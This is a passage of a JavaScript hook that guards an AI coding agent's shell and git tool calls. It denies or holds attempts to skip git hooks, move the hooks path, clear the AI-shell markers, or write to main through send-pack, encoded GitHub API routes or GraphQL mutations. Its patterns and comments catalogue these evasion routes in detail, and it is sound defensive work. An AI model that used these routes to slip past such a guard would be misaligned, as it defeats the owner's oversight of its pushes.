// mention of the hooks path but a plain read of it, and commit's -n in any git command, nested ones included.
function bypassIn(text, depth = 0) {
	const flat = text.replace(/[\\`^'"]/g, '');
	// Beside a git, a value built at run time or a backtick: an alias body or $G push --no-verif. A search for the word
	// (grep -- --no-verify) names none of them and goes on.
	const gitish = /\bgit\b|[$`]/i.test(text);
	if (gitish && /(^|[\s=])--no-ve(r(i(f(y)?)?)?)?(?=$|[\s=;&|)])/i.test(flat)) return 'git with its hooks skipped';
	// The hooks path set from the environment (GIT_CONFIG_KEY_<n>, GIT_CONFIG_PARAMETERS) moves it as -c does.
	if (/GIT_CONFIG_(KEY_\d+=\s*core\.hookspath|PARAMETERS=[^;&|\n]*hookspath)/i.test(flat)) return 'git with its hooks moved';
	// Another git folder set for the whole shell (export GIT_DIR=x; git commit), and an included config from the
	// environment (S2).
	if (/\bGIT_(DIR|COMMON_DIR)\s*=/i.test(flat) && /\bgit\b/i.test(flat)) return 'git with its hooks moved';
	if (/GIT_CONFIG_(KEY_\d+=\s*include|PARAMETERS=[^;&|\n]*include)/i.test(flat)) return 'git with its hooks moved';
	if (markersCleared(flat) && !markerOnlyNamed(text)) return MARKERS;
	for (const all of tokenize(joinContinuations(text))) {
		const words = all.filter((w) => !w.redirect).map((w) => w.value.toLowerCase());
		for (let i = 0; i < words.length; i++) {
			if (programName(words[i]) !== 'git' && programName(words[i]) !== 'git.exe') continue;
			const hit = gitHooksOff(words, i + 1, gitSubAt(words, i + 1));
			if (hit) return hit;
		}
		// A message git or gh stores (-m, --body ...) is never run (K2); one with $( ) or a backtick in it is still read.
		const msg = (k) => (words[0] === 'git' || words[0] === 'gh') && k > 0 && /^(-m|--message|--body|--title|--notes)$/.test(all[k - 1].value) && !/\$\(|`/.test(all[k].value);
		if (depth < MAX_DEPTH) for (const [k, w] of all.entries()) if (w.quoted && !msg(k)) { const hit = bypassIn(w.value, depth + 1); if (hit) return hit; }
	}
	return '';
}

// A write to main, master or the default branch that runs no pre-push hook: git send-pack, or a ref write through the
// GitHub API. The owner, 2026-11-11: a tool pushes to main only as a new repo's first push, which a plain git push
// makes and the pre-push hook checks; these routes skip that check, so no yes lets a tool take them.
// The API is read by what it writes, not by one spelling (the 1.26.0 security review, S3): a ref path with its slashes
// encoded, the merges endpoint into main, a file write through the contents endpoint to main or to the default branch
// (no branch named), and the GraphQL mutations that move a branch.
function hookFreeMainWrite(text) {
	let flat = text.replace(/[\\'"]/g, '').toLowerCase();
	const names = /(^|[\s:/+])(refs\/heads\/)?(main|master)(?=$|[\s;&|])/;
	if (/\bsend-pack\b/.test(flat) && names.test(flat)) return true;
	if (!/\bgh\b[^;&|\n]*\bapi\b/.test(flat)) return false;
	// A GraphQL query read from a file or stdin cannot be read here: held, whatever else the call says.
	if (/\bgraphql\b/.test(flat) && (/=@/.test(flat) || /\s--input(\s|=)/.test(flat))) return true;
	// An API call writes when it names a method other than GET or sends a field (gh then posts), the value attached
	// to the flag too (-fsha=x; the review on 46260d3).
	const write = /\s(-x|--method)[\s=]*(post|patch|put|delete)\b/.test(flat) || /\s(-f|--field|--raw-field|--input)(\s|=)|\s-f\S/.test(flat);
	if (!write) return false;
	// Every percent escape is undone, again and again (%252F), the way a server may read it (the review on a192e1f);
	// text that will not decode is held.
	for (let i = 0; i < 5 && /%[0-9a-f]{2}/.test(flat); i++) {
		try { flat = decodeURIComponent(flat).toLowerCase(); } catch { return true; }
	}
	if (/%[0-9a-f]{2}/.test(flat)) return true;
	const main = /(^|[=\s])(refs\/heads\/)?(main|master)(?=$|[\s;&|,}])/;
	if (/refs\/heads\/(main|master)\b/.test(flat)) return true;
	if (/\/merges\b/.test(flat) && (!/\bbase=/.test(flat) || /\bbase=(refs\/heads\/)?(main|master)\b/.test(flat))) return true;
	if (/\/contents\//.test(flat) && (!/\bbranch=/.test(flat) || /\bbranch=(refs\/heads\/)?(main|master)\b/.test(flat))) return true;
	if (/\bgraphql\b/.test(flat) && /\b(updateref|updaterefs|mergebranch|createcommitonbranch)\b/.test(flat)) return true;
	return main.test(flat) && /\/git\/refs\b/.test(flat);
}

// A push to main, master, or to wherever a bare push goes, run outside this project's work tree (git -C, --work-tree, a
// cd first, or a shell whose folder is outside the project) runs none of this project's hooks, so the pre-push hook's
// refusal of an existing main never happens (the review on 09f88b1). It fails closed: out there, only a push that
// names one plain feature branch on one remote still asks; any other push is held (the review on aee6f28).
function pushOutsideProject(text, input) {
	const flat = text.replace(/[\\'"`]/g, '');
	if (!/\bgit(\.exe)?\b[\s\S]*\bpush\b/i.test(flat)) return false;
	const root = process.env.CLAUDE_PROJECT_DIR;
	const cwd = input && input.cwd ? path.resolve(String(input.cwd)) : null;
	const fold = (p) => (process.platform === 'win32' ? p.toLowerCase() : p);
	const outside = Boolean(root && cwd) && fold(cwd) !== fold(path.resolve(root)) && !fold(cwd).startsWith(fold(path.resolve(root)) + path.sep);
	const elsewhere = outside || /\bgit(\.exe)?(\s[^;&|\n]*)?\s(-C|--work-tree)(\s|=|$)/.test(flat) || /(^|[;&|({\n]\s*)(cd|pushd|popd|chdir|set-location|sl|push-location)(\s|;|$)/im.test(flat);
	if (!elsewhere) return false;
	const plainFeature = (args) => {
		if (args.some((a) => a.startsWith('-') && !PUSH_FLAGS.has(a))) return false;
		const specs = args.filter((a) => !a.startsWith('-'));
		if (specs.length !== 2 || !/^[A-Za-z0-9._-]+$/.test(specs[0])) return false;
		const parts = specs[1].split(':');
		const dest = parts[parts.length - 1].replace(/^refs\/heads\//, '');
		return parts.length <= 2 && BRANCH.test(specs[1].replace(':', '/')) && BRANCH.test(dest) && !dest.startsWith('refs/') && !/^(main|master|head|@)$/i.test(dest);
	};
	return ![...flat.matchAll(/\bpush\b([^;&|\n]*)/gi)].every((m) => plainFeature(m[1].trim().split(/\s+/).filter(Boolean)));
}

// K28 (the 1.27.0 install review; the owner, 2026-11-12: free "if everything checks out"): the push bound is free
// because the kit's own pre-push hook scans and logs the push. A push run in another repo is free only when that repo
// is this one (a worktree shares its git folder) or its hooks are the kit's shims in the Claude folder; otherwise the
// kit cannot see the push, and it asks. With no folder for the call it cannot be placed, so it asks; with no project
// folder named, only the repo's own hooks can free it (the plan check's P8, the 1.28.0 sweep).
function uncheckedRepo(input) {
	const root = process.env.CLAUDE_PROJECT_DIR;
	const cwd = input && input.cwd ? path.resolve(String(input.cwd)) : null;
	if (!cwd) return true;
	const fold = (p) => (process.platform === 'win32' ? p.toLowerCase() : p);
	const inside = Boolean(root) && (fold(cwd) === fold(path.resolve(root)) || fold(cwd).startsWith(fold(path.resolve(root)) + path.sep));
	const git = (dir, ...a) => require('node:child_process').spawnSync('git', ['-C', dir, ...a], { encoding: 'utf8', timeout: 3000 });
	const real = (p) => { try { return fs.realpathSync.native(p).toLowerCase(); } catch { return path.resolve(p).toLowerCase(); } };
	const common = (dir) => { const r = git(dir, 'rev-parse', '--git-common-dir'); return r.status === 0 ? real(path.resolve(dir, r.stdout.trim())) : ''; };
	// By its git folder, not its path: a nested repo or a submodule under the project is another repo (the plan
	// check's P8); a folder that is no repo pushes nothing.
	const here = common(cwd);
	if (!here) return !inside;
	const mine = root ? common(path.resolve(root)) : '';
	if ((mine && here === mine) || (inside && !mine)) return false;
	const hooks = git(cwd, 'config', '--get', 'core.hooksPath').stdout.trim();
	const home = process.env.CLAUDE_CONFIG_DIR || path.join(require('node:os').homedir(), '.claude');
	return !hooks || !real(path.resolve(cwd, hooks)).startsWith(real(path.join(home, 'kit-guard')) + path.sep);
}

function decide(input) {
	const strings = [];
	collectStrings(input?.tool_input, strings, 0);
	const text = strings.join(LF);
	// Before any reading: the brace reader's time grows fast with a long run of signs (the 1.23.0 sweep).
	if (text.length > 100000) return 'a command too long to read';
	return findOutward(text, 0) || findOutward(plainText(text, input?.tool_name), 0);
}

// The guard's answer for one tool call (the input already parsed, or null when it could not be): the output to print,
// or null. The dispatcher (guard.cjs) calls this.
function check(input) {
	let reason = '';
	let prNote = '';
	let verdict = 'deny';
	try {
		if (!input || typeof input !== 'object') throw new Error('no input');
		reason = decide(input);
		const all = [];
		collectStrings(input.tool_input, all, 0);
		// The shared reader's second reading (K1, T16b): each fact written one way. It can only add a hold or make one
		// stricter; the text as written is still read first, so nothing it misses is lost.
		const text = all.join(LF);
		const canon = canonical(text);
		if (!reason && canon !== text) reason = findOutward(canon, 0) || findOutward(plainText(canon, input.tool_name), 0);
		const bypass = bypassIn(text) || (canon !== text && bypassIn(canon)) || (canon !== text && markersCleared(canon.replace(/[\\`^'"]/g, '')) ? MARKERS : '');
		if (bypass) reason = bypass;
		else if (reason && (hookFreeMainWrite(text) || hookFreeMainWrite(canon) || pushOutsideProject(text, input))) reason = 'a write to main that runs no pre-push hook';
		// A push or a PR is where a PR body goes out: name the skill that writes and audits it.
		const command = String((input.tool_input && input.tool_input.command) ?? '');
		if (/\bgit\b[\s\S]*\bpush\b|\bgh\s+pr\s+(create|edit)\b/.test(command)) prNote = 'Before a PR: its body comes from the pr-body skill, with its audit shown (rule:pr-body).';
		// Inside the push bound a feature-branch push goes without a yes; anything else held needs the owner's
		// own pop-up answer for this exact command (T1). A subagent's pop-up is no owner's, so it always hands back.
		if (reason && boundedPush(input)) reason = uncheckedRepo(input) ? 'a push from a repo whose git hooks are not the kit\'s' : '';
		if (reason && !BYPASS.has(reason) && !HELD.has(reason) && !input.agent_id && ownerYes(input)) verdict = 'allow';
	} catch {
		// A guard that cannot read the command refuses rather than lets it through.
		reason = 'the guard could not read this command';
	}
	if (!reason) return prNote ? { hookSpecificOutput: { hookEventName: 'PreToolUse', additionalContext: prNote } } : null;
	let command = '';
	try { command = String((input.tool_input && input.tool_input.command) ?? ''); } catch { /* no command */ }
	const what = reason === 'git push' ? pushLimit(command) : `${reason} is an outward act (rule:outward-acts)`;
	// The pre-push hook lets an AI push outside the bound only with its marker set: the one act to quote names it, in
	// the shell that runs it, so one pop-up covers it (C7). A push to main is for a new repo's first push only.
	const plain = reason === 'git push' && /^git push [A-Za-z0-9 ._/:+=-]+$/.test(command.trim());
	const act = !plain ? '' : input.tool_name === 'PowerShell' ? `$env:KIT_PUSH_APPROVED='1'; ${command.trim()}` : `KIT_PUSH_APPROVED=1 ${command.trim()}`;
	const lead = /a push to (main|master) is outside/.test(what) ? "Only if this is a new repo's first push" : 'To run it';
	const text = HELD.has(reason)
		? heldText(`${reason === 'a command too long to read' ? 'the command is too long for the guard to read' : 'the guard could not read this command'}, so it does not run. Shorten or split it; anything else is the owner's own, in their own terminal`)
		: reason === 'a write to main that runs no pre-push hook'
		? neverText("a write to main, master or the default branch that runs no pre-push hook; main takes a PR, and a tool pushes there only as a new repo's first push, by git push. Open a PR instead")
		: reason === MARKERS
		? neverText("clearing the AI shell's markers is a gate bypass; the pre-push hook would take the shell for the owner's own terminal and switch its checks off. Run the command with the markers in place; anything else is the owner's own, in their own terminal")
		: BYPASS.has(reason)
		? neverText(`${reason === 'git with its hooks skipped' ? 'skipping the git hooks' : 'moving the git hooks path'} is a gate bypass; it switches off the checks the owner's yes relies on. Fix what the hook reports; a skip is the owner's own, in their own terminal`)
		: verdict === 'allow' ? yesText(what) : askText(what, input, act, lead);
	const output = { hookSpecificOutput: { hookEventName: 'PreToolUse', permissionDecision: verdict, permissionDecisionReason: text } };
	// The reason is shown to the user; added context is what reaches Claude.
	if (prNote) output.hookSpecificOutput.additionalContext = prNote;
	return output;
}

function main() {
	let raw = '';
	process.stdin.setEncoding('utf8');
	process.stdin.on('data', (chunk) => {
		raw += chunk;
	});
	process.stdin.on('end', () => {
		let input = null;
		try { input = JSON.parse(raw); } catch { /* refused below */ }
		const out = check(input);
		if (out) process.stdout.write(JSON.stringify(out));
		// The decision is out before the log is touched: a log that cannot be written must never cost the hold.
		const logFile = process.argv[2];
		if (logFile) {
			try {
				const d = out && out.hookSpecificOutput.permissionDecision;
				fs.appendFileSync(logFile, new Date().toISOString() + ' ' + String((input && input.tool_name) ?? '') + ' ' + (d || 'pass') + LF);
			} catch {
				// The log is a proof aid only.
			}
		}
	});
}

if (require.main === module) main();

module.exports = { decide, boundedPush, check };
